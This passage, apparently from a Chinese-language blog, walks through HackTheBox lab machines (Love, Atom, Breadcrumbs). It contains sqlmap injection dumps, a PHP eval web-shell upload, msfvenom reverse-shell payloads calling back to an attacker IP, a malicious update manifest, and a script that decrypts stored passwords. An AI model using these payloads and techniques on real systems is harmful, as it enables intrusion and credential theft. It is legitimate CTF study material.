class="variable">$4E3VVe2PWlTMejquTmMD6</span>.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: voters</span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| Column    | Type         |</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| firstname | varchar(30)  |</span><br><span class="line">| id        | int(11)      |</span><br><span class="line">| lastname  | varchar(30)  |</span><br><span class="line">| password  | varchar(60)  |</span><br><span class="line">| photo     | varchar(150) |</span><br><span class="line">| voters_id | varchar(15)  |</span><br><span class="line">+-----------+--------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters -C voters_id, password --dump</span><br><span class="line">+-----------+----------+</span><br><span class="line">| voters_id | password |</span><br><span class="line">+-----------+----------+</span><br><span class="line">+-----------+----------+</span><br></pre></td></tr></table></figure>
<p>然而这里Hash爆破速度过慢, Bcrypt的运算复杂程度远高于md5</p>
<p><s>看了眼别人WP</s><br />
用443端口的功能访问本地5000得到登入凭证<br />
<code>admin:@LoveIsInTheAir!!!!</code><br />
<s>一直用渗透的常规思路打这台靶机, 没想到整这么一出</s><br />
登入后台后上传Shell</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/voters_add.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.10.239</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------7586397232801671174932942436</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>696</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://10.10.10.239</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.10.10.239/admin/voters.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=uofg65u57tbm4rp6jbn0359660</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">333</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;add&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436--</span><br></pre></td></tr></table></figure>
<p>蚁剑上传nc反弹shell</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\phoebe\desktop\user.txt</span><br><span class="line">fc8833cab6af6700441328fd2a4ecc04</span><br></pre></td></tr></table></figure>
<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
<blockquote>
<p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br />
<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>
<p>msfvenom生成一个Shell即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">a0f54f7853efdefe4c8cef97186db4c8</span><br></pre></td></tr></table></figure>
<blockquote>
<p>msfvenom &amp; nc</p>
</blockquote>
<p>本着能不用MSF就不用了MSF的原则<br />
没有使用meterpreter<br />
但是发现有(staged)标识还是不能用nc直接接收Shell的<br />
最后用<code>windows/x64/shell/reverse_tcp</code></p>
<hr />
<h1 id="hackthebox_atom"><a class="markdownIt-Anchor" href="#hackthebox_atom"></a> HackTheBox_Atom</h1>
<h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.237</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.237</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.237</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line">	Software_Updates Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.237\\software_updates</span><br><span class="line"></span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  ..                                  D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client1                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client3                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 19:18:08 2021</span><br><span class="line">		4413951 blocks of size 4096. 1381036 blocks available</span><br><span class="line">smb: \&gt; get UAT_Testing_Procedures.pdf</span><br><span class="line">getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Note taking application built with electron-builder which helps users in taking important<br />
notes.</p>
</blockquote>
<p><code>electron-builder</code>可以在google上搜到一个RCE漏洞</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p>
</blockquote>
<p>构造payload</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9996 -f exe &gt; s\<span class="string">&#x27;hell.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat latest.yml</span></span><br><span class="line"><span class="string">version: 1.2.3</span></span><br><span class="line"><span class="string">path: http://10.10.16.3:9999/s&#x27;</span>hell.exe</span><br><span class="line">sha512: pyfnrQs40RwrwKOWykgeZ0PKeSudGkN1UI/9j+PpxG4M42uY88j/hNAx7xWonk57X0GMdPIOma9FsfeBglTLMQ==</span><br></pre></td></tr></table></figure>
<p>开启HTTP服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure>
<p>将<code>latest.yml</code>上传至<code>client*</code>文件夹中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type c:\users\jason\desktop\user.txt</span><br><span class="line">3eda0e1bce259d8ffd4c1994f84bfdea</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\&quot;program files<span class="string">&quot;\redis\redis.windows.conf</span></span><br><span class="line"><span class="string">requirepass kidvscat_yes_kidvscat</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat</span><br><span class="line"></span><br><span class="line">keys *</span><br><span class="line">1) <span class="string">&quot;pk:ids:User&quot;</span></span><br><span class="line">2) <span class="string">&quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;</span></span><br><span class="line">3) <span class="string">&quot;pk:ids:MetaDataClass&quot;</span></span><br><span class="line">4) <span class="string">&quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;</span></span><br><span class="line"></span><br><span class="line">get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</span><br><span class="line"><span class="string">&quot;&#123;\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\users\jason\downloads\</span><br><span class="line"></span><br><span class="line">d-----          4/2/2021   8:21 PM                PortableKanban</span><br></pre></td></tr></table></figure>
<p>存在一个密码恢复的漏洞</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment"># python3 -m pip install des</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">	<span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>得到<code>kidvscat_admin_@123</code></p>
<p>evil-rm登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">2b36cf6bd3cd95fc37d6e2f81e80163b</span><br></pre></td></tr></table></figure>
<p>这提权部分实在是过于牵强了…</p>
<hr />
<h1 id="hackthebox_breadcrumbs"><a class="markdownIt-Anchor" href="#hackthebox_breadcrumbs"></a> HackTheBox_Breadcrumbs</h1>
<h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.228</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.228</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORTSTATE    SERVICE   VERSION</span><br><span class="line">22/tcp   openssh  OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp   openhttp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">135/tcp  openmsrpcMicrosoft Windows RPC</span><br><span class="line">139/tcp  opennetbios-ssn    Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  openssl/http  Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">445/tcp  openmicrosoft-ds?</span><br><span class="line">1107/tcp filtered isoipsigport-2</span><br><span class="line">3306/tcp openmysql?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/11%Time=60C2E951%P=x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowe</span></span><br><span class="line"><span class="string">SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,</span><br><span class="line">SF:49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowed\x</span></span><br><span class="line"><span class="string">SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="路径扫描"><a class="markdownIt-Anchor" href="#路径扫描"></a> 路径扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.228/</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.228/ ----</span><br><span class="line">+ http://10.10.10.228/aux (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/books/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/Books/</span><br><span class="line">+ http://10.10.10.228/cgi-bin/ (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/css/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/DB/</span><br><span class="line">+ http://10.10.10.228/examples (CODE:503|SIZE:401)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/includes/</span><br><span class="line">+ http://10.10.10.228/index.php (CODE:200|SIZE:2368)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/js/</span><br><span class="line">+ http://10.10.10.228/licenses (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/PHP/</span><br><span class="line">+ http://10.10.10.228/phpmyadmin (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/</span><br><span class="line">+ http://10.10.10.228/prn (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/server-info (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/server-status (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/webalizer (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.10.10.228/portal/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/assets/</span><br><span class="line">+ http://10.10.10.228/portal/aux (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/DB/</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/includes/</span><br><span class="line">+ http://10.10.10.228/portal/index.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://10.10.10.228/portal/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/PHP/</span><br><span class="line"></span><br><span class="line">+ http://10.10.10.228/portal/prn (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/uploads/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/vendor/</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jun 12 13:42:20 2021</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 27</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2>
<p>访问路径<code>/php/books.php</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">title=a&amp;author=&amp;method=0</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">book=book7.html&amp;method=1</span><br></pre></td></tr></table></figure>
<p>可以看到对<code>/includes/bookController.php</code>发起的两种POST请求<br />
第二种请求存在LFI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning:  file_get_contents(..&#x2F;books&#x2F;): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php on line 28</span><br><span class="line">false</span><br></pre></td></tr></table></figure>
<p>且Apache配置上存在目录遍历漏洞, 可以配合LFI进行文件读取</p>
<ul>
<li><code>/portal/authController.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;cookie.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$errors</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$userdata</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span 